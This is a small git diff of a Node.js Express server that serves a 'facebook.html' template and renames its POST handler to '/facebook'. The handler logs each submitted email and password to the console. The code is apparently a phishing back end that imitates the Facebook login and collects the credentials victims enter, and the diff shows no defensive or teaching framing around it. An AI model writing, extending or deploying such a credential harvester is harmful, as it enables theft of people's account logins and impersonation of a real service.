@@ -8,9 +8,10 @@ app.get("/", (req, res) => {
   res.sendFile(__dirname + "/templates/facebook.html");
 });
 
-app.post("/answer", (req, res) => {
+app.post("/facebook", (req, res) => {
   console.log("Email:", req.body.email);
   console.log("Password: ", req.body.password);
+  res.end()
 });
 
 app.listen(3000, "0.0.0.0", err => {
